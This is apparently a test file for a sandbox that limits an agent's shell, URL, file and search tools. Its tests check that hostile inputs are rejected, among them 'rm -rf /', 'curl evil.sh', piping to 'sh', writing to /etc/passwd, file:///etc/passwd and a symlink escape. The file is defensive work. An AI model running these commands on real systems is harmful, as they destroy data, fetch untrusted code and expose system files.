import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync, realpathSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import {
  HANDLERS,
  sanitizedEnv,
  ScopeViolation,
  assertShellAllowed,
  assertUrlAllowed,
} from "../dist/index.js";

test("shell.exec rejects command-chaining operators even when allowed", () => {
  for (const cmd of [
    "git status; rm -rf /",
    "ls && curl evil.sh",
    "echo `id`",
    "cat $(whoami)",
    "ls | sh",
    "echo x > /etc/passwd",
    "echo ${HOME}",
  ]) {
    assert.throws(() => assertShellAllowed(cmd, { allow: ["*"] }), ScopeViolation, cmd);
  }
});

test("shell.exec allows a clean matching command", () => {
  assert.doesNotThrow(() => assertShellAllowed("git diff HEAD~1", { allow: ["git *"] }));
});

test("shell.exec runs an allowed command and rejects a non-matching one", async () => {
  const out = await HANDLERS["shell.exec"]({ command: "echo hello" }, { allow: ["echo *"] });
  assert.match(out, /hello/);
  await assert.rejects(
    HANDLERS["shell.exec"]({ command: "printenv HOME" }, { allow: ["echo *"] }),
    ScopeViolation
  );
});

test("url scheme is restricted to http and https", () => {
  assert.throws(() => assertUrlAllowed("file:///etc/passwd", { domains: ["*"] }), ScopeViolation);
  assert.throws(() => assertUrlAllowed("ftp://x.com/y", { domains: ["*"] }), ScopeViolation);
});

test("domain matching is exact or dot-bounded suffix only", () => {
  assert.doesNotThrow(() => assertUrlAllowed("https://data.sec.gov/x", { domains: ["*.sec.gov"] }));
  assert.doesNotThrow(() => assertUrlAllowed("https://sec.gov/x", { domains: ["*.sec.gov"] }));
  assert.doesNotThrow(() => assertUrlAllowed("https://api.github.com", { domains: ["api.github.com"] }));
  assert.throws(() => assertUrlAllowed("https://notsec.gov", { domains: ["sec.gov"] }), ScopeViolation);
  assert.throws(() => assertUrlAllowed("https://evilsec.gov", { domains: ["*sec.gov"] }), ScopeViolation);
});

test("fs.write enforces the path allow-list", async () => {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "outfit-sec-")));
  try {
    await HANDLERS["fs.write"](
      { path: join(dir, "reports", "a.txt"), content: "hi" },
      { paths: [join(dir, "**")] }
    );
    await assert.rejects(
      HANDLERS["fs.write"]({ path: join(dir, "..", "escape.txt"), content: "x" }, { paths: [join(dir, "**")] }),
      ScopeViolation
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("fs.read blocks a symlink that escapes the allow-list", async () => {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "outfit-sym-")));
  const secret = realpathSync(mkdtempSync(join(tmpdir(), "outfit-secret-")));
  try {
    writeFileSync(join(secret, "passwd"), "TOPSECRET");
    symlinkSync(secret, join(dir, "link"));
    await assert.rejects(
      HANDLERS["fs.read"]({ path: join(dir, "link", "passwd") }, { paths: [join(dir, "**")] }),
      ScopeViolation
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(secret, { recursive: true, force: true });
  }
});

test("web.search reports a clear error when no provider is configured", async () => {
  const prevProvider = process.env.OUTFIT_SEARCH_PROVIDER;
  const prevKey = process.env.OUTFIT_SEARCH_API_KEY;
  delete process.env.OUTFIT_SEARCH_PROVIDER;
  delete process.env.OUTFIT_SEARCH_API_KEY;
  try {
    await assert.rejects(HANDLERS["web.search"]({ query: "x" }, {}), /not configured/);
  } finally {
    if (prevProvider !== undefined) process.env.OUTFIT_SEARCH_PROVIDER = prevProvider;
    if (prevKey !== undefined) process.env.OUTFIT_SEARCH_API_KEY = prevKey;
  }
});

test("sanitizedEnv strips secrets and OUTFIT_ vars but keeps PATH", () => {
  process.env.OUTFIT_SEARCH_API_KEY = "secret";
  process.env.MY_SERVICE_TOKEN = "t";
  try {
    const env = sanitizedEnv();
    assert.ok(!("OUTFIT_SEARCH_API_KEY" in env));
    assert.ok(!("MY_SERVICE_TOKEN" in env));
    assert.ok("PATH" in env);
    assert.equal(sanitizedEnv({ FOO: "bar" }).FOO, "bar");
  } finally {
    delete process.env.OUTFIT_SEARCH_API_KEY;
    delete process.env.MY_SERVICE_TOKEN;
  }
});
